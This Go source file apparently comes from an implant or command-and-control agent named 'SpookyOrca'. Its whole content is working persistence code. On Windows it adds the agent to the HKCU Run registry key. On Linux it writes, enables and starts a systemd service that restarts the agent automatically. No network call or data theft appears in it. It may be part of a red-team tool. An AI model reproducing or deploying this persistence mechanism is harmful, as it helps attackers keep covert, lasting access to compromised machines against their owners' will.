package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
)

func setupPersistence() {
	if runtime.GOOS == "windows" {
		setupPersistenceWindows()
	} else if runtime.GOOS == "linux" {
		setupPersistenceLinux()
	}
}

func setupPersistenceWindows() {
	agentPath, _ := os.Executable()
	cmd := exec.Command("reg", "add",
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", "SpookyOrcaAgent",
		"/t", "REG_SZ",
		"/d", agentPath,
		"/f")
	err := cmd.Run()
	if err != nil {
		fmt.Println("[-] Failed to set persistence:", err)
	} else {
		fmt.Println("[+] Persistence added (Windows)")
	}
}

func setupPersistenceLinux() {
	agentPath, _ := os.Executable()
	serviceContent := fmt.Sprintf(`[Unit]
Description=SpookyOrca Agent Persistence
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always

[Install]
WantedBy=multi-user.target`, agentPath)

	err := os.WriteFile("/etc/systemd/system/spookyorca-agent.service", []byte(serviceContent), 0644)
	if err != nil {
		fmt.Println("[-] Failed to set persistence:", err)
		return
	}

	exec.Command("systemctl", "enable", "spookyorca-agent.service").Run()
	exec.Command("systemctl", "start", "spookyorca-agent.service").Run()

	fmt.Println("[+] Persistence added (Linux)")
}
